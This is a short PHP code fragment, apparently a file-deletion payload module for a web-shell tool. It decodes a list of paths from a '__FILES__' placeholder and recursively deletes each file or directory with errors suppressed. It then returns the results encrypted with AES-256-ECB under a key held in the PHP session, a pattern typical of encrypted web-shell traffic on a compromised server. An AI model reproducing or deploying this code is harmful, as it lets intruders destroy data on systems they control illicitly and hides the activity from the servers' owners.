
function rm_dir($dir)
{
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        is_dir("$dir/$file") ? rm_dir("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$files = json_decode(base64_decode('__FILES__'));
$status = array();
foreach ($files as $file) {
    $status[$file] = is_dir($file) ? rm_dir($file) : unlink($file);
}

$data = array(
    "status" => $status
);

echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
